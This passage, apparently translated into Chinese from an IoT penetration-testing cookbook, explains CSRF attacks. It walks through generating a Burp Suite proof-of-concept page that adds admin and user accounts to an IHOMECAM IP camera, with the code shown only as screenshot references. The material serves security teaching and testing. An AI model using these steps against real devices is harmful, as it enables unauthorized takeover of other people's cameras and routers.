+   在尝试利用 XSS 时有许多注意事项，超出了基本的警报框。经常需要调整编码以逃避过滤器或由于字符限制而最小化有效负载。有关逃避过滤器和 XSS 的一般帮助，请查看 OWASP 的 XSS 维基页面，网址为[`www.owasp.org/index.php/Cross-site_Scripting_(XSS)`](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))。XSS 维基页面还链接到几个 XSS 测试指南文件，例如逃避过滤器。

# 利用 CSRF

CSRF 是一种攻击，它欺骗受害者以受害者的身份和权限提交恶意请求，以代表受害者执行不需要的功能。对于大多数应用程序，浏览器将自动包括任何相关的会话信息，如用户的会话 cookie、令牌、IP 地址，有时还包括 Windows 域凭据 NTLM 哈希。如果受害者用户当前已经在站点上进行了身份验证，站点将无法区分受害者发送的伪造请求和受害者发送的合法请求。

CSRF 攻击针对引起服务器状态更改的应用功能，例如更改受害者的电子邮件地址、密码或各种其他应用程序配置设置。如果攻击成功，对手不会收到响应，只有受害者会收到。因此，CSRF 攻击针对以自动方式执行的更改状态的配置请求。由于嵌入式物联网设备由于硬件计算复杂性而容易受到 CSRF 攻击的影响。尽管有预防性设计模式，不需要服务器端状态，而是应用程序验证 HTTP 引用者和来源标头，但这些并不是有效的解决方案。

CSRF 攻击已经被用于针对物联网设备和 SOHO 路由器的恶意软件，以将受害者的流量重定向到攻击者控制的 DNS 服务器，用于控制互联网流量以及进行 DDoS 攻击。其中一些恶意软件分别称为 SOHO Pharming（[`www.team-cymru.com/ReadingRoom/Whitepapers/2013/TeamCymruSOHOPharming.pdf`](https://www.team-cymru.com/ReadingRoom/Whitepapers/2013/TeamCymruSOHOPharming.pdf)）和 DNSChanger（[`www.proofpoint.com/us/threat-insight/post/home-routers-under-attack-malvertising-windows-android-devices`](https://www.proofpoint.com/us/threat-insight/post/home-routers-under-attack-malvertising-windows-android-devices)）。在本教程中，我们将演示如何在目标设备上利用 CSRF。

# 准备工作

为了利用 CSRF，我们将使用 Burp Suite 和易受攻击的 IHOMECAM ICAM-608 IP 摄像头。

# 如何做...

我们发现应用程序是否容易受到 CSRF 攻击的第一步是观察请求参数和 HTML 表单值，这些值会改变应用程序的状态。如果每个参数都没有发送一个随机令牌，或者 HTML 表单中没有硬编码的令牌，那么应用程序很可能容易受到 CSRF 攻击。我们要么改变对我们作为攻击者有利的敏感配置，要么对设备进行持久化，比如添加用户。

1.  让我们看一下目标 IP 摄像头的用户设置配置页面及其源代码：

![](img/f3984ef0-4e53-46a7-942a-412868599cce.png)

1.  用户设置页面的源代码看起来似乎没有包含反 CSRF 令牌，并且盲目地将参数输入到页面的 URL 中而没有任何验证：

![](img/1395fc52-c7e4-445a-8165-f89f2ea70382.png)

我们现在可以创建一个**概念验证**（**PoC**）CSRF HTML 页面，代表受害者创建三个用户。

1.  首先，我们需要右键单击易受攻击的 HTTP 请求，然后选择生成 CSRF PoC：

![](img/601612c0-ec5c-44db-9a52-01dff3d5937d.png)

1.  Burp Suite 创建了一个我们可以武装并根据需要调整的 PoC HTML 页面。我们的下一步是更改管理员用户设置，并通过硬编码输入值添加两个新用户。在下面的截图中，我们添加了`IoTCookbookUserAdmin`，`IoTCookbookUser1`和`IoTCookbookUser2`：

![](img/e9caa619-1b80-42e5-85c0-2db77dcf97da.png)

1.  在浏览器中选择测试，弹出以下框：

![](img/e3770d3b-7f60-4550-8c1a-60eeadb1f90c.png)

1.  将链接复制到浏览器中：

![](img/a59cd1cc-5f91-49d1-80aa-7a366df75908.png)

1.  一旦在浏览器中运行链接，请观察发送到 Burp Suite 代理 HTTP 历史记录的请求，其中包含我们在 PoC HTML 页面中使用的硬编码输入值，用于将用户添加到 IP 摄像机：

![](img/fdd8e5e9-480f-483f-8757-e04d1457bcb8.png)

1.  刷新 IP 摄像机的用户设置页面以查看所做的更改：

![](img/d4a50a84-d353-451f-a126-1c72ff833d81.png)

当发送 CSRF PoC 页面给受害者时，可以利用类似的策略和技术，基于上述恶意软件。管理员和用户帐户将以自动化方式创建，允许攻击者代表受害者用户进行未经授权的更改。

# 另请参阅

+   有关审查代码以查找和防止 CSRF 漏洞的额外指导，请参考 OWASP 的 CSRF 维基页面[`www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)`](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))。
